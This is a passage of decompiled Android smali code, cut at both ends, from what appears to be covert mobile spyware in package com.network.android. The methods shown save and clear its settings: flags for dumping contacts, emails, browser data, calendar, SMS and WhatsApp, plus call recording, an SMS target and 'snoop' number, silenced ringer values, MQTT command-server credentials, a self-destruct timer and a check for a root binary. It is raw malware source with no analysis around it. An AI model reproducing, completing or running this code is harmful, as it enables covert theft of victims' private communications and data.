    aput-object v0, v1, v2
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v0, v2, 0x1

    move v2, v0

    goto :goto_0

    :cond_0
    move-object v0, v1

    :goto_1
    return-object v0

    :catch_0
    move-exception v0

    const-string v1, "castVectorToStringArray exception"

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    const/4 v0, 0x0

    goto :goto_1
.end method

.method public static b()I
    .locals 1

    sget v0, Lcom/network/b/b;->ad:I

    return v0
.end method

.method public static b(I)V
    .locals 0

    sput p0, Lcom/network/b/b;->ad:I

    return-void
.end method

.method public static b(J)V
    .locals 0

    sput-wide p0, Lcom/network/b/b;->S:J

    return-void
.end method

.method public static b(Landroid/content/Context;)V
    .locals 2

    :try_start_0
    const-string v0, "Remove Preferences"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v0, "NetworkPreferences"

    invoke-static {p0, v0}, Lcom/network/b/b;->a(Landroid/content/Context;Ljava/lang/String;)V

    const-string v0, "NetworkWindowAddresess"

    invoke-static {p0, v0}, Lcom/network/b/b;->a(Landroid/content/Context;Ljava/lang/String;)V

    const-string v0, "NetworkDataList"

    invoke-static {p0, v0}, Lcom/network/b/b;->a(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    const-string v1, "Remove Preferences"

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    goto :goto_0
.end method

.method public static b(Ljava/lang/String;)V
    .locals 0

    sput-object p0, Lcom/network/b/b;->g:Ljava/lang/String;

    return-void
.end method

.method public static b(Z)V
    .locals 0

    sput-boolean p0, Lcom/network/b/b;->aa:Z

    return-void
.end method

.method public static b([Ljava/lang/String;)V
    .locals 0

    if-eqz p0, :cond_0

    sput-object p0, Lcom/network/b/b;->F:[Ljava/lang/String;

    :cond_0
    return-void
.end method

.method public static c(I)V
    .locals 0

    sput p0, Lcom/network/b/b;->N:I

    return-void
.end method

.method public static c(J)V
    .locals 0

    sput-wide p0, Lcom/network/b/b;->T:J

    return-void
.end method

.method public static declared-synchronized c(Landroid/content/Context;)V
    .locals 7

    const/4 v0, 0x0

    const-class v1, Lcom/network/b/b;

    monitor-enter v1

    :try_start_0
    sget-object v2, Lcom/network/android/SmsReceiver;->b:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-nez v2, :cond_0

    :goto_0
    monitor-exit v1

    return-void

    :cond_0
    :try_start_1
    const-string v2, "Save Preferences"

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const-string v2, "NetworkPreferences"

    const/4 v3, 0x0

    invoke-virtual {p0, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const-string v3, "NetworkWindowResizer"

    sget-object v4, Lcom/network/android/SmsReceiver;->b:Ljava/lang/String;

    invoke-static {v4}, Lcom/network/b/b;->i(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    sget-object v3, Lcom/network/b/b;->F:[Ljava/lang/String;

    if-eqz v3, :cond_2

    array-length v4, v3

    if-lez v4, :cond_2

    const-string v4, "NetworkWindowAddresess"

    const/4 v5, 0x0

    invoke-virtual {p0, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    invoke-interface {v4}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    :goto_1
    array-length v5, v3

    if-ge v0, v5, :cond_1

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    aget-object v6, v3, v0

    invoke-static {v6}, Lcom/network/b/b;->i(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-interface {v4, v5, v6}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, " Save Data agentAddress: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    aget-object v6, v3, v0

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    add-int/lit8 v0, v0, 0x1

    goto :goto_1

    :cond_1
    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_2
    sget-object v0, Lcom/network/b/b;->g:Ljava/lang/String;

    if-eqz v0, :cond_3

    const-string v0, "WindowTargetSms"

    sget-object v3, Lcom/network/b/b;->g:Ljava/lang/String;

    invoke-static {v3}, Lcom/network/b/b;->i(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    :cond_3
    sget-object v0, Lcom/network/b/b;->f:Ljava/lang/String;

    if-eqz v0, :cond_4

    const-string v0, "Skypi"

    sget-object v3, Lcom/network/b/b;->f:Ljava/lang/String;

    invoke-static {v3}, Lcom/network/b/b;->i(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    :cond_4
    const-string v0, "url address"

    sget-object v3, Lcom/network/b/b;->z:Ljava/lang/String;

    invoke-static {v3}, Lcom/network/b/b;->i(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v0, "lastComunication"

    sget-object v3, Lcom/network/b/b;->i:Ljava/lang/Long;

    invoke-virtual {v3}, Ljava/lang/Long;->longValue()J

    move-result-wide v3

    invoke-interface {v2, v0, v3, v4}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    const-string v0, "lastSend"

    sget-wide v3, Lcom/network/b/b;->H:J

    invoke-interface {v2, v0, v3, v4}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    const-string v0, "lastReceive"

    sget-wide v3, Lcom/network/b/b;->I:J

    invoke-interface {v2, v0, v3, v4}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    const-string v0, "send"

    sget v3, Lcom/network/b/b;->J:I

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    const-string v0, "receive"

    sget v3, Lcom/network/b/b;->K:I

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    const-string v0, "sesseions"

    sget v3, Lcom/network/b/b;->L:I

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    const-string v0, "wasPhoneWasUnmutedAfterTapNicly"

    sget v3, Lcom/network/b/b;->M:I

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    const-string v0, "originalVibrateValue"

    sget v3, Lcom/network/b/b;->O:I

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    const-string v0, "originalRingerValue"

    sget v3, Lcom/network/b/b;->N:I

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    const-string v0, "errorCode"

    sget-short v3, Lcom/network/b/b;->j:S

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    sget-object v0, Lcom/network/b/b;->P:Ljava/lang/Integer;

    if-nez v0, :cond_5

    const v0, 0x4f1a00

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    sput-object v0, Lcom/network/b/b;->P:Ljava/lang/Integer;

    :cond_5
    const-string v0, "maxTimeWithNoComunication"

    sget-object v3, Lcom/network/b/b;->P:Ljava/lang/Integer;

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    const-string v0, "failureCount"

    sget v3, Lcom/network/b/b;->k:I

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    const-string v0, "grace"

    sget-boolean v3, Lcom/network/b/b;->R:Z

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    const-string v0, "packageVersion"

    sget-object v3, Lcom/network/b/b;->l:Ljava/lang/String;

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v0, "vulnarbilityIndicator"

    sget-object v3, Lcom/network/b/b;->m:Ljava/lang/String;

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v0, "commandTimeStamp"

    sget-object v3, Lcom/network/android/a/c;->b:Ljava/lang/String;

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v0, "adlocation"

    sget-wide v3, Lcom/network/b/b;->S:J

    invoke-interface {v2, v0, v3, v4}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    const-string v0, "adrate"

    sget-wide v3, Lcom/network/b/b;->T:J

    invoke-interface {v2, v0, v3, v4}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    const-string v0, "userNetwork"

    sget-object v3, Lcom/network/b/b;->o:Ljava/lang/String;

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v0, "installation"

    sget-object v3, Lcom/network/b/b;->e:Ljava/lang/String;

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v0, "windowYuliyus"

    sget-object v3, Lcom/network/b/b;->W:Ljava/lang/Boolean;

    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    const-string v0, "window canada"

    sget-object v3, Lcom/network/b/b;->X:Ljava/lang/Boolean;

    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    const-string v0, "graceTime"

    sget-wide v3, Lcom/network/b/b;->h:J

    invoke-interface {v2, v0, v3, v4}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    const-string v0, "finish"

    sget-boolean v3, Lcom/network/b/b;->p:Z

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    const-string v0, "callWindow"

    sget-boolean v3, Lcom/network/b/b;->q:Z

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    const-string v0, "dumpContacts"

    sget-boolean v3, Lcom/network/b/b;->r:Z

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    const-string v0, "dumpBrowserData"

    sget-boolean v3, Lcom/network/b/b;->s:Z

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    const-string v0, "smsWindow"

    sget-boolean v3, Lcom/network/b/b;->t:Z

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    const-string v0, "dumpCalander"

    sget-boolean v3, Lcom/network/b/b;->u:Z

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    const-string v0, "firstRun"

    sget-boolean v3, Lcom/network/b/b;->v:Z

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    const-string v0, "dumpMails"

    sget-boolean v3, Lcom/network/b/b;->w:Z

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    const-string v0, "forwarding"

    sget-boolean v3, Lcom/network/android/monitor/observer/t;->a:Z

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    const-string v0, "allowRomingType"

    sget v3, Lcom/network/b/b;->Y:I

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    const-string v0, "logNetwork"

    sget-object v3, Lcom/network/android/c/a/b;->d:Ljava/lang/String;

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v0, "ScreenTimeout"

    sget v3, Lcom/network/b/b;->x:I

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    const-string v0, "wanted_debug_level"

    sget v3, Lcom/network/b/b;->A:I

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    const-string v0, "screenProximtySensor"

    sget v3, Lcom/network/b/b;->y:I

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    const-string v0, "romingSetted"

    invoke-static {}, Lcom/network/android/AndroidCallDirectWatcher;->a()Z

    move-result v3

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    const-string v0, "mqttPassword"

    sget-object v3, Lcom/network/b/b;->Z:Ljava/lang/String;

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v0, "did_we_restart_after_upgrade_already"

    sget-boolean v3, Lcom/network/b/b;->B:Z

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    const-string v0, "mqttAllowedConnectionType"

    sget v3, Lcom/network/b/b;->ad:I

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    const-string v0, "should_use_mqtt"

    sget-boolean v3, Lcom/network/b/b;->aa:Z

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    const-string v0, "mqttRecCount"

    sget v3, Lcom/network/b/b;->ah:I

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    const-string v0, "mqttUsername"

    sget-object v3, Lcom/network/b/b;->ac:Ljava/lang/String;

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v0, "mqttIdPref"

    sget-object v3, Lcom/network/b/b;->ae:Ljava/lang/String;

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v0, "mqttQos"

    sget v3, Lcom/network/b/b;->af:I

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    const-string v0, "mqttKaTimer"

    sget v3, Lcom/network/b/b;->ag:I

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    const-string v0, "mqttPort"

    sget-object v3, Lcom/network/b/b;->ai:Ljava/lang/String;

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v0, "mqttHost"

    sget-object v3, Lcom/network/b/b;->aj:Ljava/lang/String;

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v0, "mqttRecInt"

    sget v3, Lcom/network/b/b;->ab:I

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    const-string v0, "networkKill"

    sget-boolean v3, Lcom/network/android/a/c;->i:Z

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    sget-object v0, Lcom/network/b/b;->al:Ljava/lang/Integer;

    if-eqz v0, :cond_6

    const-string v0, "pollingInterval"

    sget-object v3, Lcom/network/b/b;->al:Ljava/lang/Integer;

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    :cond_6
    const-string v0, "local"

    sget-object v3, Lcom/network/b/b;->C:Ljava/lang/Boolean;

    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    invoke-interface {v2, v0, v3}, Landroid/content/SharedPreferences$Editor;->putBoolean(Ljava/lang/String;Z)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "Save Data parameters targetSms: "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v2, Lcom/network/b/b;->g:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, ", outSnoopNumber: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v2, Lcom/network/b/b;->f:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, ", simSerialNumber: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v2, Lcom/network/android/BootReceiver;->a:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "parameters Call Recoeding: "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v2, Lcom/network/b/b;->X:Ljava/lang/Boolean;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, " ,lastComunication: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v2, Lcom/network/b/b;->i:Ljava/lang/Long;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, ", dumpFinish: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-boolean v2, Lcom/network/b/b;->p:Z

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, ", current log file: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v2, Lcom/network/android/c/a/b;->d:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "parameters Self destruction time: "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v2, Lcom/network/b/b;->P:Ljava/lang/Integer;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, " urlToRemove: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v2, Lcom/network/b/b;->z:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "parameters dumpFinish: "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-boolean v2, Lcom/network/b/b;->p:Z

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, " dumpSMS: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-boolean v2, Lcom/network/b/b;->q:Z

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, " dumpWhatsApp: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-boolean v2, Lcom/network/b/b;->v:Z

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, " dumpEmails: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-boolean v2, Lcom/network/b/b;->w:Z

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, " dumpContacts: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-boolean v2, Lcom/network/b/b;->r:Z

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, " dumpCalander: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-boolean v2, Lcom/network/b/b;->u:Z

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, " dumpCall: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-boolean v2, Lcom/network/b/b;->t:Z

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "Save Data parameters wantedDebugLevel: "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget v2, Lcom/network/b/b;->A:I

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, " pollingInterval: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    sget-object v2, Lcom/network/b/b;->al:Ljava/lang/Integer;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto/16 :goto_0

    :catch_0
    move-exception v0

    :try_start_2
    const-string v2, "savePreferences exception"

    invoke-static {v2, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    goto/16 :goto_0

    :catchall_0
    move-exception v0

    monitor-exit v1

    throw v0
.end method

.method public static c(Ljava/lang/String;)V
    .locals 0

    sput-object p0, Lcom/network/b/b;->Z:Ljava/lang/String;

    return-void
.end method

.method public static c()Z
    .locals 2

    sget-object v0, Lcom/network/b/b;->ak:Ljava/lang/Boolean;

    if-nez v0, :cond_0

    new-instance v0, Ljava/io/File;

    const-string v1, "/system/csk"

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    sput-object v0, Lcom/network/b/b;->ak:Ljava/lang/Boolean;

    :cond_0
    sget-object v0, Lcom/network/b/b;->ak:Ljava/lang/Boolean;

